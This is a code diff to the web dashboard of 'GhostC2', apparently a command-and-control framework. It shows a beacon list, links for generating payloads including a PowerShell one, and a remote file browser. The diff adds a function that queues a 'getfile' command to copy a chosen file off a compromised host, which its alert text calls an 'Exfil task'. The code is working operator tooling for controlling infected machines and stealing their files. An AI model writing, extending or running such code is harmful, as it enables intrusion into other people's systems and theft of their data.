@@ -202,7 +202,6 @@
             <a href="/generate">Generate Payload</a>
             <a href="/upload">Upload</a>
             <a href="/generate_ps_payload" target="_blank">PowerShell Payload</a>
-
         </nav>
         <div class="theme-switcher">
             <button onclick="setTheme('green')" class="active">🟢</button>
@@ -214,9 +213,6 @@
     <div id="main">
         <h1>GhostC2 Beacon Dashboard</h1>
         <button id="toggleBtn" onclick="toggleInactive()">Hide Inactive Beacons</button>
-        
-        
-
 
         <table id="beacon-table">
             <thead>
@@ -308,7 +304,7 @@
         <h2 id="file-browser-title">File Browser</h2>
         <div id="file-browser-path"></div>
         <table style="width:100%; margin-top:10px;" id="file-browser-table"></table>
-    </div>    
+    </div>
 
     <script>
         // Theme Switcher
@@ -344,24 +340,23 @@
             return bytes.toFixed(1) + ' ' + units[u];
         }
 
+        let currentBeacon = "";
+        let modalOpen = false;
+        let showInactive = false; // Hide inactive by default
 
-            let currentBeacon = "";
-            let modalOpen = false;
-            let showInactive = false; // Hide inactive by default
+        function toggleInactive() {
+            showInactive = !showInactive;
+            document.querySelectorAll(".beacon-row.inactive").forEach(row => {
+                row.style.display = showInactive ? "" : "none";
+            });
+            document.getElementById("toggleBtn").textContent = showInactive ? "Hide Inactive Beacons" : "Show Inactive Beacons";
+        }
 
-            function toggleInactive() {
-                showInactive = !showInactive;
-                document.querySelectorAll(".beacon-row.inactive").forEach(row => {
-                    row.style.display = showInactive ? "" : "none";
-                });
-                document.getElementById("toggleBtn").textContent = showInactive ? "Hide Inactive Beacons" : "Show Inactive Beacons";
-            }
-
-            window.onload = function() {
-                showInactive = false;
-                document.getElementById("toggleBtn").textContent = "Show Inactive Beacons";
-                loadBeacons();
-            };
+        window.onload = function() {
+            showInactive = false;
+            document.getElementById("toggleBtn").textContent = "Show Inactive Beacons";
+            loadBeacons();
+        };
 
         async function loadBeacons() {
             const res = await fetch("/api/beacons");
@@ -547,42 +542,55 @@
                 } else {
                     parent = path.replace(/\/[^\/]+\/?$/, '/');
                 }
-                rows += `<tr><td colspan=3><a href="#" style="color:var(--accent);" onclick="openFileBrowser(currentBrowseHost, '${parent}'); return false;">.. (Up)</a></td></tr>`;
+                rows += `<tr><td colspan=4><a href="#" style="color:var(--accent);" onclick="openFileBrowser(currentBrowseHost, '${parent}'); return false;">.. (Up)</a></td></tr>`;
             }
             for (let entry of entries) {
                 if (entry.type === 'folder') {
                     let sep = (path.endsWith('\\') || path.endsWith('/')) ? '' : (path.includes('\\') ? '\\' : '/');
                     let nextPath = path + sep + entry.name + (path.includes('\\') ? '\\' : '/');
-                    rows += `<tr><td>📁</td><td><a href="#" style="color:var(--accent);" onclick="openFileBrowser(currentBrowseHost, '${nextPath}'); return false;">${entry.name}</a></td><td>Folder</td></tr>`;
+                    rows += `<tr>
+                        <td>📁</td>
+                        <td><a href="#" style="color:var(--accent);" onclick="openFileBrowser(currentBrowseHost, '${nextPath}'); return false;">${entry.name}</a></td>
+                        <td>Folder</td>
+                        <td></td>
+                    </tr>`;
                 } else {
+                    // Make sure size is a valid number or "N/A"
+                    let displaySize = entry.size === "N/A" ? "N/A" : humanFileSize(entry.size);
+                    // Build full file path
+                    let sep = (path.endsWith('\\') || path.endsWith('/')) ? '' : (path.includes('\\') ? '\\' : '/');
+                    let filePath = path + sep + entry.name;
                     rows += `<tr>
                         <td>📄</td>
                         <td>${entry.name}</td>
-                        <td>${humanFileSize(entry.size)}</td>
+                        <td>${displaySize}</td>
                         <td>
-                            <button onclick="downloadFileFromBeacon('${currentBrowseHost}', '${path.replace(/\\/g, '\\\\')}${(path.endsWith('/')||path.endsWith('\\\\'))?'':'/'}${entry.name}')"
+                            <button onclick="event.stopPropagation(); getFileFromBrowser('${currentBrowseHost}', '${filePath.replace(/'/g,"\\'")}');"
                                 style="background:#232; color:#aaffaa; font-weight:bold; border:none; border-radius:2px; padding:2px 10px; box-shadow:0 0 6px #22ff44aa; cursor:pointer;">
-                                Download
+                                Get
                             </button>
                         </td>
                     </tr>`;
-
                 }
             }
             document.getElementById('file-browser-table').innerHTML = rows;
         }
-        
-        function downloadFileFromBeacon(hostname, filepath) {
-            fetch(`/api/download/${hostname}?path=${encodeURIComponent(filepath)}`)
-                .then(res => res.json())
-                .then(data => {
-                    if (data.status === "queued") {
-                        alert("Download task queued! Check Task History for status and download from server/downloads when complete.");
-                    } else {
-                        alert("Failed to queue download task.");
-                    }
-                });
-    }
+
+        // Queue a getfile task for exfil (Add-Task flow)
+        function getFileFromBrowser(hostname, filepath) {
+            fetch('/add_task', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `hostname=${encodeURIComponent(hostname)}&command=${encodeURIComponent('getfile ' + filepath)}`
+            })
+            .then(res => {
+                if (res.ok) {
+                    alert("Exfil task queued for: " + filepath + ".\nCheck Task History for status.");
+                } else {
+                    alert("Failed to queue exfil task.");
+                }
+            });
+        }
 
         function closeFileBrowser() {
             document.getElementById('file-browser-modal').style.display = 'none';
